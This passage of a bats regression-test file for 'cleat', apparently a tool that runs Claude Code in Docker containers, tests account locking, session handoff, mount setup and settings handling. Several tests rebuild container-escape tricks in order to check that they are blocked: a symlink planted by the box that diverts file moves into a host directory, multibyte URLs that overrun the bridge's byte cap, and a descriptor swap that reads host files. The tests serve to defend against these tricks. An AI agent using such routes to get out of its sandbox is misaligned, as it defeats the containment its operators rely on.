    assert_equal "$mode harvest $status" "$mode harvest 0"
    run grep -c "rt-G2$mode" "$store"
    assert_output "1"
    # Box B attaches on the old generation. Nothing is held and nothing is said.
    run _account_sync_in "$b"
    assert_success
    refute_output --partial "Kept a login"
    run grep -c "rt-G2$mode" "$staged_b"
    assert_output "1"
    # And the release path, which every switch, remove and nuke goes through.
    run _account_with_lock _account_release_staged_locked "$c"
    assert_success
    refute_output --partial "Kept a login"
    run test -e "$CLEAT_ACCOUNTS_DIR/.held"
    assert_failure
  done
  unset -f command
}

# ─────────────────────────────────────────────────────────────────────────────
# Every mkdir failure read as "someone else holds the lock", so an accounts
# directory that could not take a lock at all (root-owned after a sudo run, a
# read-only mount, a full disk) was polled for the whole twenty seconds, twice
# per session (attach and session end), and the line at the end of it named
# another cleat command and asked for a retry that could never work.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a lock that cannot be made fails at once and names the directory" {
  _acct_race_setup
  local rc=0 lock
  _ACCOUNT_LOCK_WAIT_S=20
  lock="$(_account_lock_path)"
  _account_lock_pause() { echo poll >> "$TEST_TEMP/polls"; }
  # What EACCES, EROFS and ENOSPC all look like: mkdir fails and leaves nothing
  # at the path.
  mkdir() {
    [[ "$1" == "$lock" ]] && return 1
    command mkdir "$@"
  }
  _account_lock || rc=$?
  assert_equal "unwritable $rc" "unwritable $_ACCOUNT_LOCK_BUSY"
  run test -e "$TEST_TEMP/polls"
  assert_failure
  run _account_busy_msg
  assert_output --partial "Check that $CLEAT_ACCOUNTS_DIR is writable."
  refute_output --partial "Try again in a moment"
  # And the session end, which is where a pinned box meets this twice a session.
  run _maybe_report_account_harvest_busy "$_ACCOUNT_LOCK_BUSY"
  assert_output --partial "Check that $CLEAT_ACCOUNTS_DIR is writable."
  refute_output --partial "saved when the next session ends"
  unset -f mkdir
  # A lock another live command holds is still waited on, and still says so.
  rc=0
  _ACCOUNT_LOCK_WAIT_S=1
  command mkdir -p "$lock"
  printf 'host %s pid %s at %s\n' "${HOSTNAME:-unknown}" "$$" "$(date +%s)" > "$lock/owner"
  _account_lock || rc=$?
  assert_equal "busy $rc" "busy $_ACCOUNT_LOCK_BUSY"
  run wc -l < "$TEST_TEMP/polls"
  assert_output --partial "10"
  run _account_busy_msg
  assert_output --partial "Try again in a moment"
  refute_output --partial "is writable"
  run _maybe_report_account_harvest_busy "$_ACCOUNT_LOCK_BUSY"
  assert_output --partial "saved when the next session ends"
  refute_output --partial "is writable"
}

# ─────────────────────────────────────────────────────────────────────────────
# The session-end harvest makes a bounded network request whenever the box
# refreshed and the refresh token rotated. It ran BEFORE the terminal restore,
# so a black-holed route, a captive portal or a dropped VPN left the terminal
# in Claude's raw mode for the whole timeout with nothing on screen saying why.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: the session-end harvest runs only after the terminal is back" {
  _account_sync_out() { echo harvest >> "$TEST_TEMP/order"; return 0; }
  _restore_terminal() { echo restore >> "$TEST_TEMP/order"; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  run cat "$TEST_TEMP/order"
  assert_output "$(printf 'restore\nharvest')"
}

# v1.5.0: the live account switch holds Claude's OWN refresh lock across the
# SIGTERM, so no token refresh of the outgoing store can start (and be lost to
# Claude's 2000 ms shutdown cap) during the stop. The fake Claude records, at
# the instant it takes the signal, whether the lock dir was held. See concept/44.
@test "regression v1.5.0: a handoff holds the outgoing refresh lock across the signal" {
  hb_require_linux
  hb_reset_pids
  local BH="$TEST_TEMP/box" PV="$TEST_TEMP/pv"
  mkdir -p "$BH/.claude/sessions" "$PV"
  local SID="d7b73579-1111-2222-3333-444455556666" EXECID="deadbeef1234cafe"
  local lockrec="$TEST_TEMP/lockrec"
  HB_LOCK="$BH/.claude/.oauth_refresh.lock" HB_LOCKREC="$lockrec" \
    hb_spawn_claude exits "$SID" "$EXECID" idle
  local t1="$HB_PID" r1="$HB_RS"
  hb_proc_view "$PV"
  run hb_run_box terminate "$BH" "$PV" default 8 8 1 "$t1" "$r1" "$SID" "$EXECID" idle
  assert_success
  assert_line "end	ok"
  assert_equal "$(cat "$lockrec" 2>/dev/null)" "yes"
}

# v1.5.0: a Claude that starts AFTER the kill (a background command's session, a
# hand-started one) must abort the switch at the final scan, never be staged
# over. The fake Claude's SIGTERM trap starts a fresh marked claude; the verb's
# final scan under the lock must see it and abort. See concept/44.
@test "regression v1.5.0: a handoff never stages over a Claude that started after the kill" {
  hb_require_linux
  hb_reset_pids
  local BH="$TEST_TEMP/box" PV="$TEST_TEMP/pv"
  mkdir -p "$BH/.claude/sessions" "$PV"
  local SID="d7b73579-1111-2222-3333-444455556666" EXECID="deadbeef1234cafe"
  HB_PROC_VIEW="$PV" hb_spawn_claude spawns "$SID" "$EXECID" idle
  local t1="$HB_PID" r1="$HB_RS"
  hb_proc_view "$PV"
  run hb_run_box terminate "$BH" "$PV" default 8 8 1 "$t1" "$r1" "$SID" "$EXECID" idle
  assert_success
  assert_line "pid	$t1 exited"
  assert_line "scan	changed"
  assert_line "end	abort"
  refute_line "end	ok"
}

# v1.5.2: on an amd64 box under Rosetta (or any qemu-user binfmt), a process
# can read [interpreter, binary, original argv...] in /proc/<pid>/cmdline. The
# final scan judged the interpreter, so a Claude started in the switch window was
# invisible and the switch staged over it. Measured: the test above failed 10 of
# 10 under Docker Desktop's Rosetta on Apple Silicon and passes with the strip.
@test "regression v1.5.2: the final scan aborts a switch over a Claude seen through a binfmt interpreter" {
  hb_require_linux
  hb_reset_pids
  local BH="$TEST_TEMP/box" PV="$TEST_TEMP/pv"
  mkdir -p "$BH/.claude/sessions" "$PV"
  local SID="d7b73579-1111-2222-3333-444455556666" EXECID="deadbeef1234cafe"
  # A real Claude passes the recheck and takes the SIGTERM. Its successor then
  # appears the way Rosetta showed one on an amd64 box, so the final scan is the
  # only thing standing between it and a switch staged over it.
  HB_PROC_VIEW="$PV" hb_spawn_claude spawns_binfmt "$SID" "$EXECID" idle
  local t1="$HB_PID" r1="$HB_RS"
  hb_proc_view "$PV"
  run hb_run_box terminate "$BH" "$PV" default 8 8 1 "$t1" "$r1" "$SID" "$EXECID" idle
  assert_success
  assert_line "pid	$t1 exited"
  assert_line "scan	changed"
  assert_line "end	abort"
  refute_line "end	ok"
}

@test "regression v1.5.0: every attach and shell waits for the account lock before it reads the pin" {
  # attack 1.1, the default-pin gap: a box on the shared login read its pin with
  # NO lock, so an attach or a shell racing a shared-to-named switch read the old
  # pin after the switch had checked its markers but before it moved the pin, and
  # ran on the shared login while the switch staged the named one. The fix is one
  # account-lock take-and-release (_account_attach_gate) before the pin read in
  # both exec_claude and cmd_shell. This proves the gate's lock op runs before the
  # pin is ever read; _account_settle itself waits the lock out (test 67 proves
  # the busy path). Instrument the two functions and check the order.
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work"; chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
  printf '{"claudeAiOauth":{"accessToken":"a","refreshToken":"r","expiresAt":1789003600000,"subscriptionType":"max"}}\n' > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  _host_clip_cmd() { echo ""; }
  _host_open_cmd() { echo ""; }

  eval "$(declare -f _account_settle | sed '1s/_account_settle/_orig_settle/')"
  _account_settle() { echo "settle" >> "$TEST_TEMP/order"; _orig_settle "$@"; }
  eval "$(declare -f _box_account_read | sed '1s/_box_account_read/_orig_bar/')"
  _box_account_read() { echo "read:$1" >> "$TEST_TEMP/order"; _orig_bar "$@"; }

  _order_gate_first() {   # FILE CNAME: the first settle precedes the first pin read
    local f="$1" cn="$2" s r
    s="$(grep -n '^settle$' "$f" | head -1 | cut -d: -f1)"
    r="$(grep -n "^read:${cn}$" "$f" | head -1 | cut -d: -f1)"
    [ -n "$s" ] || { echo "the gate never took the account lock"; return 1; }
    [ -n "$r" ] || { echo "the pin was never read"; return 1; }
    [ "$s" -lt "$r" ] || { echo "the pin was read (line $r) before the gate (line $s)"; return 1; }
  }

  # exec_claude
  local ecn="cleat-race-ec"
  mkdir -p "$CLEAT_RUN_DIR/$ecn"
  printf '%s\n' "work" > "$CLEAT_BOX_ACCOUNTS_DIR/$ecn"
  : > "$TEST_TEMP/order"
  run exec_claude "$ecn" --dangerously-skip-permissions
  _order_gate_first "$TEST_TEMP/order" "$ecn" || fail "exec_claude read the pin before the account gate"

  # cmd_shell
  mkdir -p "$TEST_TEMP/project"
  local scn; scn="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$scn"
  printf '%s\n' "work" > "$CLEAT_BOX_ACCOUNTS_DIR/$scn"
  : > "$TEST_TEMP/order"
  run cmd_shell "$TEST_TEMP/project"
  _order_gate_first "$TEST_TEMP/order" "$scn" || fail "cmd_shell read the pin before the account gate"
}

# v1.5.0: a live account switch relaunches with `--resume <sid>`, NEVER
# `--continue`. Right after the SIGTERM the reopening conversation is the newest
# transcript, so --continue would open a sibling session and two processes would
# append to one file (x3 c3). See concept/44 5.6.
_rl_exec_fixture() {
  cat > "$TEST_TEMP/exec.sh" <<'SH'
#!/usr/bin/env bash
flat="$(printf '%s ' "$@" | tr '\n' ' ')"
case "$flat" in *clip-daemon*) : ;; *) exit 0 ;; esac
n=$(cat "$HB_EXEC_COUNT" 2>/dev/null || echo 0); n=$((n+1)); printf '%s' "$n" > "$HB_EXEC_COUNT"
printf '%s\n' "$flat" >> "$HB_EXEC_ARGV"
[ -n "${HB_ORDER:-}" ] && printf 'exec\n' >> "$HB_ORDER"
id=""; for a in "$@"; do case "$a" in CLEAT_EXEC_ID=*) id="${a#CLEAT_EXEC_ID=}";; esac; done
line=$(sed -n "${n}p" "$HB_PLAN" 2>/dev/null); set -- $line
code="${1:-0}"; action="${2:-}"
if [ "$action" = ready ] && [ -n "$id" ]; then
  { printf 'v=1\n'; printf 'state=ready\n'; printf 'by=%s\n' "$HB_TICKET_BY"; \
    printf 'at=%s\n' "$(date +%s)"; printf 'sid=%s\n' "$HB_TICKET_SID"; printf 'to=default\n'; } > "$HB_RUN_DIR/.handoff.$id"
fi
exit "$code"
SH
  chmod +x "$TEST_TEMP/exec.sh"; export DOCKER_STUB_EXEC_SCRIPT="$TEST_TEMP/exec.sh"
}

_rl_regression_setup() {
  CN="cleat-rlr-01"; SID="d7b73579-1111-2222-3333-444455556666"
  _RESOLVED_PROJECT="$TEST_TEMP/proj"; _BOX=main; mkdir -p "$_RESOLVED_PROJECT"
  SDIR="$(_sessions_key_dir "$_RESOLVED_PROJECT" main)"; mkdir -p "$SDIR"
  printf '{"type":"user","message":{"role":"user"},"parentUuid":null}\n' > "$SDIR/$SID.jsonl"
  HB_RUN_DIR="$CLEAT_RUN_DIR/$CN"; mkdir -p "$HB_RUN_DIR"
  export HB_EXEC_COUNT="$TEST_TEMP/ec" HB_EXEC_ARGV="$TEST_TEMP/eargv" HB_PLAN="$TEST_TEMP/plan"
  export HB_RUN_DIR HB_TICKET_BY="$$" HB_TICKET_SID="$SID"
  : > "$HB_EXEC_ARGV"; rm -f "$HB_EXEC_COUNT"
  mock_docker_ps "$CN"
  _is_interactive() { return 0; }
  _rl_exec_fixture
}

@test "regression v1.5.0: a handoff relaunch never reopens another conversation of the same box" {
  _rl_regression_setup
  printf '143 ready\n0\n' > "$HB_PLAN"
  run exec_claude "$CN" --dangerously-skip-permissions
  assert_success
  run sed -n '2p' "$HB_EXEC_ARGV"
  assert_output --partial "--resume $SID"
  refute_output --partial "--continue"
}

@test "regression v1.5.0: session end cleanup and harvest never run between a handoff signal and the relaunch" {
  _rl_regression_setup
  export HB_ORDER="$TEST_TEMP/order"; : > "$HB_ORDER"
  _account_sync_out() { echo harvest >> "$HB_ORDER"; return 0; }
  printf '143 ready\n0\n' > "$HB_PLAN"
  run exec_claude "$CN" --dangerously-skip-permissions
  assert_success
  # The harvest runs once, after BOTH execs: never between the signal and the
  # relaunch. Order is exactly exec, exec, harvest.
  run cat "$HB_ORDER"
  assert_output "$(printf 'exec\nexec\nharvest')"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: pinning LC_ALL=C in _derive_project_session_key re-keyed every
# non-ASCII project folder. v1.4.3 ran tr and sed in the caller's locale, so a
# UTF-8 shell keyed /x/café one way and the pinned form keys it another, and the
# project's whole session history and .claude.json store went missing on
# upgrade. The C key stays the default, but a legacy key whose session directory
# exists (and the C key's does not) is kept.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a non-ASCII project keeps its pre-pin session key on upgrade" {
  local proj="/x/café" hash ckey legacy="" loc cand
  hash="$(echo -n "$proj" | _md5 | head -c 8)"
  ckey="$(basename "$proj" | LC_ALL=C tr '[:upper:]' '[:lower:]' | LC_ALL=C sed 's/[^a-z0-9-]/-/g')"
  for loc in C.UTF-8 en_US.UTF-8; do
    cand="$(basename "$proj" | LC_ALL="$loc" tr '[:upper:]' '[:lower:]' 2>/dev/null | LC_ALL="$loc" sed 's/[^a-z0-9-]/-/g' 2>/dev/null)"
    if [ -n "$cand" ] && [ "$cand" != "$ckey" ]; then legacy="$cand"; break; fi
  done
  [ -n "$legacy" ] || skip "no usable UTF-8 locale on this host"

  # No legacy directory: the C key.
  LC_ALL=C run _derive_project_session_key "$proj"
  assert_output "${ckey}-${hash}"

  # A v1.4.3 session directory under the UTF-8 key: that key is kept.
  mkdir -p "$HOME/.claude/projects/${legacy}-${hash}"
  LC_ALL=C run _derive_project_session_key "$proj"
  assert_output "${legacy}-${hash}"

  # A named box looks for its own suffixed directory.
  LC_ALL=C run _derive_project_session_key "$proj" az
  assert_output "${ckey}-${hash}-az"
  mkdir -p "$HOME/.claude/projects/${legacy}-${hash}-az"
  LC_ALL=C run _derive_project_session_key "$proj" az
  assert_output "${legacy}-${hash}-az"

  # Once the C key's own directory exists, it wins.
  mkdir -p "$HOME/.claude/projects/${ckey}-${hash}"
  LC_ALL=C run _derive_project_session_key "$proj"
  assert_output "${ckey}-${hash}"
}

@test "regression v1.5.0: a symlinked legacy session directory is never adopted as the key" {
  local proj="/x/café" hash ckey legacy="" loc cand
  hash="$(echo -n "$proj" | _md5 | head -c 8)"
  ckey="$(basename "$proj" | LC_ALL=C tr '[:upper:]' '[:lower:]' | LC_ALL=C sed 's/[^a-z0-9-]/-/g')"
  for loc in C.UTF-8 en_US.UTF-8; do
    cand="$(basename "$proj" | LC_ALL="$loc" tr '[:upper:]' '[:lower:]' 2>/dev/null | LC_ALL="$loc" sed 's/[^a-z0-9-]/-/g' 2>/dev/null)"
    if [ -n "$cand" ] && [ "$cand" != "$ckey" ]; then legacy="$cand"; break; fi
  done
  [ -n "$legacy" ] || skip "no usable UTF-8 locale on this host"
  mkdir -p "$HOME/.claude/projects" "$TEST_TEMP/elsewhere"
  ln -s "$TEST_TEMP/elsewhere" "$HOME/.claude/projects/${legacy}-${hash}"
  LC_ALL=C run _derive_project_session_key "$proj"
  assert_output "${ckey}-${hash}"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: only cmd_run and cmd_resume wrote the box settings overlay. A plain
# `cleat` (cmd_start) after a declined or non-TTY cap drift launched with
# ACTIVE_CAPS empty, so no red guard line printed, while the overlay still held
# the unsafe-rm PermissionRequest hook from the create. cmd_start now refreshes
# the overlays to match the caps of this launch.
# ─────────────────────────────────────────────────────────────────────────────
_urm_start_fixture() {
  command -v jq >/dev/null 2>&1 || skip "needs jq"
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$HOME/.claude"
  echo '{"model":"opus"}' > "$HOME/.claude/settings.json"
  CN="$(container_name_for "$TEST_TEMP/project")"
  OVL="$CLEAT_RUN_DIR/${CN}/settings"
  mkdir -p "$OVL"
  echo '{"model":"opus"}' > "$OVL/settings.json"
  _inject_unsafe_rm_hook "$OVL/settings.json"
  mock_docker_ps "$CN"
  mock_docker_ps_a "$CN"
  exec_claude() { return 0; }
}

@test "regression v1.5.0: plain cleat drops a stale unsafe-rm hook when the cap is not active" {
  _urm_start_fixture
  run jq -r '.hooks.PermissionRequest[0].matcher' "$OVL/settings.json"
  assert_output "Bash"
  cmd_start "$TEST_TEMP/project" >/dev/null 2>&1
  run jq -r '.hooks.PermissionRequest // "none"' "$OVL/settings.json"
  assert_output "none"
  run jq -r '.model' "$OVL/settings.json"
  assert_output "opus"
}

@test "regression v1.5.0: plain cleat keeps the unsafe-rm hook when the cap is active" {
  _urm_start_fixture
  _CLI_CAPS=(unsafe-rm)
  cmd_start "$TEST_TEMP/project" >/dev/null 2>&1
  run jq -r '.hooks.PermissionRequest[0].matcher' "$OVL/settings.json"
  assert_output "Bash"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: the nested mount targets inside ~/.claude (history.jsonl, the
# settings mask, the kit, private and instruction-surface masks) were only
# re-created by cmd_run. A stopped box went straight to `docker start`, so a
# target that vanished between sessions (a host `claude install` removes
# ~/.claude/local) failed the start on VirtioFS. Both start paths now prepare
# the targets first.
# ─────────────────────────────────────────────────────────────────────────────
_mount_targets_fixture() {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  CN="$(container_name_for "$TEST_TEMP/project")"
  mkdir -p "$CLEAT_RUN_DIR/${CN}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${CN}/settings/settings.json"
  mock_docker_ps_a "$CN"
  is_running() { return 1; }
  _container_has_kit_mounts() { return 0; }
  exec_claude() { return 0; }
  export MT_SEEN="$TEST_TEMP/targets-at-start"
  : > "$MT_SEEN"
  docker() {
    if [[ "${1:-}" == start ]]; then
      local t
      for t in launch.json local history.jsonl settings.json projects/-workspace CLAUDE.md; do
        [[ -e "$HOME/.claude/$t" ]] && echo "$t" >> "$MT_SEEN"
      done
    fi
    command docker "$@"
  }
  mkdir -p "$HOME/.claude"
  [[ ! -e "$HOME/.claude/launch.json" && ! -e "$HOME/.claude/local" ]]
}

@test "regression v1.5.0: cmd_start re-creates vanished mount targets before docker start" {
  _mount_targets_fixture
  cmd_start "$TEST_TEMP/project" >/dev/null 2>&1 || true
  run grep -c "^docker start $CN" "$DOCKER_CALLS"
  assert_output "1"
  run cat "$MT_SEEN"
  assert_line "launch.json"
  assert_line "local"
  assert_line "history.jsonl"
  assert_line "settings.json"
  assert_line "projects/-workspace"
  assert_line "CLAUDE.md"
}

@test "regression v1.5.0: cmd_resume re-creates vanished mount targets before docker start" {
  _mount_targets_fixture
  cmd_resume "$TEST_TEMP/project" >/dev/null 2>&1 || true
  run grep -c "^docker start $CN" "$DOCKER_CALLS"
  assert_output "1"
  run cat "$MT_SEEN"
  assert_line "launch.json"
  assert_line "local"
  assert_line "history.jsonl"
  assert_line "settings.json"
  assert_line "projects/-workspace"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: `cleat account <name>` on a box that never started printed a raw
# "line N: .../claude.json.identity-stale: No such file or directory" above the
# success line. The stale-identity flag lives beside the per-project claude.json,
# which has no directory yet, and a failed redirect reports itself before its
# own 2>/dev/null applies. Strict-mode cover is in smoke.bats.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: flagging a stale identity on a never-started box prints nothing" {
  CLEAT_PROJECTS_DIR="$TEST_TEMP/projects-store"
  mkdir -p "$TEST_TEMP/proj"
  run _handoff_flag_identity_stale "$TEST_TEMP/proj" main
  assert_success
  assert_output ""
  # With the directory there, the flag is written as before.
  local key
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  run _handoff_flag_identity_stale "$TEST_TEMP/proj" main
  assert_success
  run test -e "$CLEAT_PROJECTS_DIR/$key/claude.json.identity-stale"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: on a host with no jq every project .claude/settings*.json was mounted
# as `{}`, including a file with no hooks at all, so its permissions, env and
# model silently vanished from the box. v1.4.3 passed such a file through. Only
# a file that could define hooks now gets the empty settings, with a warning.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a jq-less host passes a hook-free project settings file through unchanged" {
  mock_docker_images "cleat"
  : > "$CLEAT_GLOBAL_CONFIG"
  mkdir -p "$TEST_TEMP/project/.claude"
  printf '{"permissions":{"allow":["Bash(npm test)"]},"env":{"FOO":"bar"},"model":"opus"}\n' \
    > "$TEST_TEMP/project/.claude/settings.json"
  _hide_jq
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  refute_output --partial "defines hooks and jq is not installed"
  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.json"
  run cmp "$TEST_TEMP/project/.claude/settings.json" "$overlay"
  assert_success
}

@test "regression v1.5.0: a jq-less host warns when a project settings file with hooks is emptied" {
  mock_docker_images "cleat"
  : > "$CLEAT_GLOBAL_CONFIG"
  mkdir -p "$TEST_TEMP/project/.claude"
  # The key spelled with a JSON escape still counts as hooks.
  printf '{"\\u0068ooks":{"Stop":[]}}\n' \
    > "$TEST_TEMP/project/.claude/settings.local.json"
  _hide_jq
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Project .claude/settings.local.json defines hooks and jq is not installed on the host"
  run cat "$CLEAT_RUN_DIR/${cname}/settings/project-settings.local.json"
  assert_output "{}"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: the recreate note for a box that predates the ~/.claude masks told
# every box to run `cleat rm && cleat`. A bare `cleat rm` removes main without a
# prompt, so a named box followed the advice and destroyed the wrong box. v1.5.0
# makes the note fire for every pre-1.5.0 box on every start.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: the pre-mask recreate note names the box it is about" {
  container_exists() { return 0; }
  local cn="cleat-proj-12345678-az" base _p dests
  base=$'/home/coder/.claude/CLAUDE.md\n/home/coder/.claude/agents\n/home/coder/.claude/commands\n/home/coder/.claude/skills\n/home/coder/.claude/plugins'
  _BOX=az

  # Missing a kit mask.
  mock_docker_inspect $'/home/coder/.claude/CLAUDE.md'
  run _maybe_note_missing_kit_masks "$cn"
  assert_output --partial "predates the read-only ~/.claude masks"
  assert_output --partial "cleat rm az && cleat start az"
  refute_output --partial "cleat rm && cleat"

  # Missing the per-box private dirs.
  mock_docker_inspect "$base"
  run _maybe_note_missing_kit_masks "$cn"
  assert_output --partial "predates the per-box ~/.claude state directories"
  assert_output --partial "cleat rm az && cleat start az"

  # Missing the instruction-surface masks (a v1.4.3 box).
  dests="$base"
  for _p in $_CLAUDE_PRIVATE_DIRS; do dests="$dests"$'\n'"/home/coder/.claude/$_p"; done
  mock_docker_inspect "$dests"
  run _maybe_note_missing_kit_masks "$cn"
  assert_output --partial "predates the ~/.claude instruction-surface masks"
  assert_output --partial "cleat rm az && cleat start az"

  # main keeps the short form.
  _BOX=main
  run _maybe_note_missing_kit_masks "$cn"
  assert_output --partial "cleat rm && cleat"
}

@test "regression v1.5.0: a snapshot is taken where -ef and the inode disagree" {
  # macOS /dev/fd/N is a devfs node. Its inode is the file's, its device is
  # devfs, so `-ef` (device AND inode) never matched there. Every account
  # harvest on a Mac refused: `cleat login` into a pinned box left the login in
  # the box, the account read "signed out" and the next attach staged over it.
  # Linux could not see it, because there /dev/fd/N is a symlink stat follows.
  local src="$TEST_TEMP/staged.json" other="$TEST_TEMP/other.json"
  printf '{"a":1}\n' > "$src"
  printf '{"b":2}\n' > "$other"
  # A host that answers "same inode" for a pair `-ef` calls different files.
  # That disagreement is the Darwin case, and only an inode reader survives it.
  ls() { printf '424242 %s\n' "${!#}"; }
  exec 7<"$other"
  run _fd_holds_path 7 "$src"
  exec 7<&-
  unset -f ls
  assert_success
}

@test "regression v1.5.0: a snapshot still refuses a descriptor on another file" {
  # The inode reader must keep the guarantee -ef was there for: the descriptor
  # the copy is read from has to be the file the path names, or a swap between
  # the check and the open reads a host file into the account store.
  local src="$TEST_TEMP/staged2.json" other="$TEST_TEMP/other2.json"
  printf '{"a":1}\n' > "$src"
  printf '{"b":2}\n' > "$other"
  exec 7<"$other"
  run _fd_holds_path 7 "$src"
  exec 7<&-
  assert_failure

  # The same file matches, so the refusal above is the swap and not the reader.
  exec 7<"$src"
  run _fd_holds_path 7 "$src"
  exec 7<&-
  assert_success
}

@test "regression v1.5.0: a snapshot refuses a symlinked path and a missing one" {
  # -L is checked after the open, so a link swapped in and left there is caught
  # even though the descriptor is already held.
  local src="$TEST_TEMP/staged3.json" link="$TEST_TEMP/link3.json"
  printf '{"a":1}\n' > "$src"
  ln -s "$src" "$link"
  exec 7<"$src"
  run _fd_holds_path 7 "$link"
  assert_failure
  run _fd_holds_path 7 "$TEST_TEMP/not-there.json"
  exec 7<&-
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# vNEXT: the image request was claimed by renaming it to `.image-req.claimed`
# in the box's own read-write clip dir. The box could plant that name as a link
# to a host directory, and mv then moved the request, a file or a whole tree of
# the box's choosing, into that directory, outside every mount, four times a
# second.
@test "regression v1.5.3: an image request was moved through a link the box planted" {
  local clip="$TEST_TEMP/ir/clip" i
  mkdir -p "$clip" "$TEST_TEMP/hostdir" "$TEST_TEMP/bin"
  printf '#!/bin/sh\nexit 0\n' > "$TEST_TEMP/bin/docker"
  chmod +x "$TEST_TEMP/bin/docker"
  PATH="$TEST_TEMP/bin:$PATH"
  _host_clip_read_image() { return 1; }
  ln -s "$TEST_TEMP/hostdir" "$clip/.image-req.claimed"
  mkdir "$clip/.image-req"
  printf 'box payload\n' > "$clip/.image-req/evil"
  _clipimg_watcher "$clip" "abox" >/dev/null 2>&1 &
  local wpid=$!
  i=0
  while { [ -e "$clip/.image-req" ] || [ -L "$clip/.image-req" ]; } && [ "$i" -lt 40 ]; do
    sleep 0.1; i=$((i+1))
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  run ls -A "$TEST_TEMP/hostdir"
  assert_output ""
}

# ─────────────────────────────────────────────────────────────────────────────
# vNEXT: the browser bridge's 2048 cap on a box-chosen URL counted characters,
# not bytes. ${#url} follows the caller's locale, and a Mac terminal runs in a
# UTF-8 one, so a URL of multibyte characters passed at up to four times the
# bytes the cap and its documented bandwidth (about 60 KB a session) allow.
@test "regression v1.5.3: the bridge URL cap counted characters, not bytes" {
  local utf8; utf8="$(locale -a 2>/dev/null | grep -iE '\.(utf-?8)$' | head -1 || true)"
  [ -n "$utf8" ] || skip "no UTF-8 locale available on this host"
  LC_ALL="$utf8"
  # 1500 two-byte characters: under 2048 characters, over 3000 bytes.
  local pad; pad="$(printf '\303\251%.0s' $(seq 1 1500))"
  run _bridge_url_host "https://claude.ai/x?p=$pad"
  assert_failure
  run _bridge_url_host "https://claude.ai/x?p=short"
  assert_success
  assert_output "claude.ai"
}

# v1.5.4: _is_auth_url_shape caps the ENCODED redirect_uri at 2048 bytes before
# it decodes it. Nothing tested that cap. It is out of reach through
# _is_auth_url, whose origin gate refuses a whole URL over 2048 bytes first. The
# value is a substring of that URL. The watcher reaches it directly: it asks
# the shape question of a refused origin, and that URL runs to the 8192 bytes
# the claim reads. %41 pads at three encoded bytes per decoded byte, so the
# decoded callback stays far under _bridge_url_host's own cap and only the
# encoded cap can refuse it.
@test "regression v1.5.4: the auth-shape check caps the encoded redirect_uri at 2048 bytes" {
  local head="https://sso.example.com/authorize?client_id=x&redirect_uri="
  local cb="http%3A%2F%2Flocalhost%3A45454%2Fcb%3Fp%3D"
  local pad; pad="$(printf '%%41%.0s' $(seq 1 668))"
  local enc="${cb}${pad}AA"
  # The fixture checks its own size, so an edit to cb cannot move the boundary.
  run printf '%s' "${#enc}"
  assert_output "2048"
  run _is_auth_url_shape "${head}${enc}&scope=a"
  assert_success
  # 2049 encoded bytes, 699 decoded.
  run _is_auth_url_shape "${head}${enc}A&scope=a"
  assert_failure
}

# v1.5.4: the same change that moved _bridge_url_host's cap to bytes moved the
# redirect_uri cap in _is_auth_url_shape too. Only the first had a test.
# Under the UTF-8 locale a Mac terminal runs in, ${#enc} alone counts characters.
@test "regression v1.5.4: the auth-shape redirect_uri cap counts bytes, not characters" {
  local utf8; utf8="$(locale -a 2>/dev/null | grep -iE '\.(utf-?8)$' | head -1 || true)"
  [ -n "$utf8" ] || skip "no UTF-8 locale available on this host"
  LC_ALL="$utf8"
  local head="https://sso.example.com/authorize?client_id=x&redirect_uri="
  local cb="http%3A%2F%2Flocalhost%3A45454%2Fcb%3Fp%3D"
  local pad; pad="$(printf '%%41%.0s' $(seq 1 500))"
  local two three
  two="$(printf '\303\251%.0s' $(seq 1 200))"
  three="$(printf '\303\251%.0s' $(seq 1 300))"
  # 1942 bytes.
  run _is_auth_url_shape "${head}${cb}${pad}${two}&scope=a"
  assert_success
  # 2142 bytes but only 1842 characters. It decodes to 1128 bytes, under
  # _bridge_url_host's cap, so only the encoded cap refuses it.
  run _is_auth_url_shape "${head}${cb}${pad}${three}&scope=a"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: `cleat session rm` moved a session into <key>/.cleat-trash, inside the
# session dir the box mounts read-write. The box could plant a link at the entry
# name the delete was about to create (the epoch is predictable, the uuid is
# known to it), and the delete moved the transcript into whatever host directory
